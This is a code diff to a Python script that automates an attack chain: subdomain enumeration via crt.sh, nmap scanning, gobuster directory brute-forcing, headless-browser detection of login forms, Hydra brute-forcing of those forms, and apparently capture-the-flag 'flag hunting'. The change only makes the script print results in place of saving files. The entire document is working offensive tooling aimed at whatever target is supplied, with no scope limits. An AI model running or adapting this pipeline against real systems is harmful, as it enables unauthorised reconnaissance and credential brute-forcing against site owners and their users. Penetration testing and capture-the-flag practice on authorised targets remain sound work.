@@ -20,18 +20,16 @@ def parse_args():
     return parser.parse_args()
 
 # ------------------ Utility ------------------
-def run_command(cmd, output_file=None):
+def run_command(cmd):
     try:
         result = subprocess.check_output(cmd, stderr=subprocess.STDOUT)
-        if output_file:
-            with open(output_file, 'wb') as f:
-                f.write(result)
-        return result.decode()
+        decoded = result.decode()
+        print(decoded)
+        return decoded
     except subprocess.CalledProcessError as e:
-        if output_file:
-            with open(output_file, 'wb') as f:
-                f.write(e.output)
-        return e.output.decode()
+        decoded = e.output.decode()
+        print(decoded)
+        return decoded
 
 def make_dir(target):
     timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
@@ -58,47 +56,41 @@ def nmap_scan(target):
     return ports
 
 # ------------------ Subdomain Enumeration ------------------
-def subdomain_enum(domain, out_dir):
+def subdomain_enum(domain):
     print("[*] Running subdomain enumeration via crt.sh...")
     url = f"https://crt.sh/?q=%25.{domain}&output=json"
     try:
         response = requests.get(url, timeout=10)
         if response.status_code == 200:
             subdomains = sorted({entry['name_value'] for entry in response.json()})
-            with open(f"{out_dir}/subdomains.txt", "w") as f:
-                for sub in subdomains:
-                    f.write(sub + "\n")
-            print(f"[+] Found {len(subdomains)} subdomains.")
+            print(f"[+] Found {len(subdomains)} subdomains:")
+            for sub in subdomains:
+                print(f" - {sub}")
         else:
             print("[-] crt.sh failed")
     except Exception as e:
         print(f"[-] Error during subdomain enumeration: {e}")
 
 # ------------------ Gobuster Scan ------------------
-def gobuster_scan(target, port, out_dir, wordlist):
+def gobuster_scan(target, port, wordlist):
     url = f"http://{target}:{port}"
-    output = f"{out_dir}/gobuster_{port}.txt"
-    cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-o", output, "-q"]
+    cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-q"]
     print(f"[*] Running Gobuster on {url} ...")
-    run_command(cmd)
+    output = run_command(cmd)
     return output
 
 # ------------------ Parse Gobuster ------------------
-def find_login_like_paths(gobuster_file):
+def find_login_like_paths(gobuster_output):
     login_keywords = ['login', 'signin', 'auth', 'admin', 'panel']
     found = []
-    if not os.path.exists(gobuster_file):
-        print(f"[-] Gobuster output file {gobuster_file} not found.")
-        return found
-    with open(gobuster_file, 'r') as f:
-        for line in f:
-            path = line.split()[0]
-            if any(keyword in path.lower() for keyword in login_keywords):
-                found.append(path)
+    for line in gobuster_output.splitlines():
+        path = line.split()[0]
+        if any(keyword in path.lower() for keyword in login_keywords):
+            found.append(path)
     return found
 
 # ------------------ Selenium Login Form Detection ------------------
-def detect_login_forms(target, port, paths, out_dir):
+def detect_login_forms(target, port, paths):
     chrome_options = Options()
     chrome_options.add_argument("--headless")
     chrome_options.add_argument("--no-sandbox")
@@ -115,8 +107,6 @@ def detect_login_forms(target, port, paths, out_dir):
             if driver.find_elements("css selector", 'input[type="password"]'):
                 print(f"[+] Login form found at {path}")
                 login_paths.append(path)
-                screenshot_file = f"{out_dir}/login_{port}_{path.strip('/').replace('/', '_')}.png"
-                driver.save_screenshot(screenshot_file)
         except Exception as e:
             print(f"[-] Error loading {full_url}: {e}")
 
@@ -124,16 +114,21 @@ def detect_login_forms(target, port, paths, out_dir):
     return login_paths
 
 # ------------------ Hydra Brute Force ------------------
-def run_hydra_login(target, port, login_path, users, passwords, fail_str, out_dir):
+def run_hydra_login(target, port, login_path, users, passwords, fail_str):
     print(f"[*] Running Hydra brute force on http://{target}:{port}{login_path} ...")
     hydra_cmd = [
         "hydra", "-L", users, "-P", passwords,
         f"{target}:{port}",
         "http-post-form",
-        f"{login_path}:username=^USER^&password=^PASS^:F={fail_str}",
-        "-o", f"{out_dir}/hydra_{port}_{login_path.strip('/').replace('/', '_')}.txt"
+        f"{login_path}:username=^USER^&password=^PASS^:F={fail_str}"
     ]
-    subprocess.run(hydra_cmd)
+    try:
+        result = subprocess.check_output(hydra_cmd, stderr=subprocess.STDOUT)
+        decoded = result.decode()
+        print(decoded)
+    except subprocess.CalledProcessError as e:
+        decoded = e.output.decode()
+        print(f"[-] Hydra failed:\n{decoded}")
 
 # ------------------ Flag Hunting ------------------
 def find_flags(driver, base_url):
@@ -173,23 +168,22 @@ def main():
     hydra_passwords = args.passwords
     fail_string = args.failstr
 
-    out_dir = make_dir(target)
-    subdomain_enum(target, out_dir)
+    subdomain_enum(target)
     http_ports = nmap_scan(target)
 
     for port in http_ports:
-        gobuster_output = gobuster_scan(target, port, out_dir, gobuster_wordlist)
+        gobuster_output = gobuster_scan(target, port, gobuster_wordlist)
         login_paths = find_login_like_paths(gobuster_output)
         if not login_paths:
             print(f"[-] No login paths found on port {port}, skipping...")
             continue
-        login_forms = detect_login_forms(target, port, login_paths, out_dir)
+        login_forms = detect_login_forms(target, port, login_paths)
         if not login_forms:
             print(f"[-] No login forms confirmed on port {port}, skipping brute force...")
             continue
 
         for path in login_forms:
-            run_hydra_login(target, port, path, hydra_users, hydra_passwords, fail_string, out_dir)
+            run_hydra_login(target, port, path, hydra_users, hydra_passwords, fail_string)
 
             chrome_options = Options()
             chrome_options.add_argument("--headless")
